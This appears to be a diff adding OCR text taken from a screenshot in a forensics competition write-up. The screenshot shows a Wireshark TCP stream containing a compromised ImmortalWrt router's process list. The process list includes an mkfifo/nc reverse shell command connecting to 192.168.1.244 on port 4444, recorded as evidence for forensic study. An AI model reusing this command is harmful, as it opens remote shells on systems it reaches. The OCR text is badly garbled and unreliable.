@@ -1,0 +1,108 @@
+# OCR: 8046799831100c351cc397135b701bf9.webp
+# 来源: ./02-WriteUp/2025/2025-数证杯-初赛/8046799831100c351cc397135b701bf9.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:29
+
+Wireshark·追踪TCP流(tcp.streameqO)·流量包.pcap
+1231root 1232root 1263root
+.[o1286 root 14861ogd
+.~.Fo 1540 root
+2090root 2091root
+SW oSw OSW
+2064S
+[napi/phy0-11][napi/phy0-12][mt76-txphyo]
+Iwk
+[kworker/R-fullc]
+/sbin/1ogd--s128
+/sbin/rpcd-s/var/run/ubus/ubus.sock-t3e
+4304
+s
+2852S
+(hostapd)/sbin/ujail -t 5 -n hostapd -Unetwork-G network -C /etc/capabilities/wpad.json -c--/u
+2852
+s
+.~..0 2116 network
+{wpasupplicant)/sbin/ujail-t5-nwpasupplicant-Unetwork-Gnetwork-C/etc/capabilities/wpad
+9956
+s
+/usr/sbin/wpasupplicant-n-s-g/var/run/wpasupplicant/global/usr/sbin/hostapd-s-g/var/run/hostapd/global
+2117
+network
+.~..0
+2155 2194root 2274root 2276root 2277root 2278root
+S
+10820
+2696
+root
+1258ms 1344S 1336S 1348S 1336S 1644S
+2375root
+.+o2405root
+S
+/sbin/netifd
+/usr/bin/dockerd--iptables=false
+44445
+/bin/sh-cmkfifo/tmp/f2>/dev/null;cat/tmp/f//bin/sh-i2>&1/nc192.168.1.244
+cat/tmp/f/bin/sh-i
+nc192.168.1.2444445/usr/sbin/odhcpd
+IW<
+.~..0 2501 root
+2566root 2603root 2711nobody 3204root
+.~..0 3205 root
+3509root 3514root
+.~..0 3515root 3547
+root
+3584ntp
+.~..0
+3833root 3974root 4007root
+1988S
+1288S 1892S 2348S 1132S
+[kworker/1:2H]
+/tmp/f
+口
+/usr/sbin/uhttpd-f-h/www-rImmortalwrt-x/cgi-bin-u/ubus-t60-T30-k20-A1-n3-N100
+/usr/sbin/vsftpd-olistenaddress=0.0.0.0-olisten=YEs-olistenipv6=No/var/run/vsftpd/vsftpd.conf/usr/bin/dbus-daemon--system--nofork
+avahi-daemon:running[Immortalwrt.local]
+/usr/sbin/dropbear-F-P/var/run/dropbear.1.pid-p192.168.1.1:22-pfd5b:fa44:af66::1:22-K300
+1132
+S
+1344S 1336S
+/usr/sbin/dropbear-F-P/var/run/dropbear.2.pid-p222-K300-T3-w262144
+ash
+-c export LANG-"en_US";export LANGUAGE-"en US";export LC ALL="enUS";free;echo finalshell separ sleep1
+1344
+R
+2852s
+ps
+[ntpd)/sbin/ujail-t 5-nntpd-Untp-Gntp-C/etc/capabilities/ntpd.json-c-u-r/bin/ubus-r
+1336
+24780D 1240mS 2852S
+.~..04025dnsmasq
+/usr/sbin/ntpd-n-N-S/usr/sbin/ntpd-hotplug-pntp.tencent.com-p ntpl.aliyun.com-pntp.ntsc.ac
+/usr/bin/ttyd-ibr-lan/bin/login.~..o
+containerd--config/var/run/docker/containerd/containerd.toml--log-levelwarn
+[dnsmasq)/sbin/ujail-t5-ndnsmasg-u-l-r/bin/ubus-r/etc/Tz-r/etc/dnsmasg.conf-r/etc/et
+5628S
+6055root 6377root
+.!o 6379root.~..0 6639 root 6766.root
+IW 1468S
+1356
+S
+/usr/sbin/dnsmasq-C/var/etc/dnsmasq.conf.cfg01411c-k-x/var/run/dnsmasq/dnsmasq.cfg01411c.pid
+[kworker/o:1-eve]/bin/login
+S
+10652
+OIW
+-ash
+wpa_supplicant-B-iwlano-c/tmp/wpa_supplicant.conf
+[kworker/1:1-mm]
+分组307304.302客户满分组，226服务器分组，444turm(s点击选择
+整个对话（16kB）查找：
+显示为ASCII
+Nodelta times
+滤掉此流
+流0
+x 图
+区分大小写找下一个（N）
+公金号金星路400
+美团
+帮助
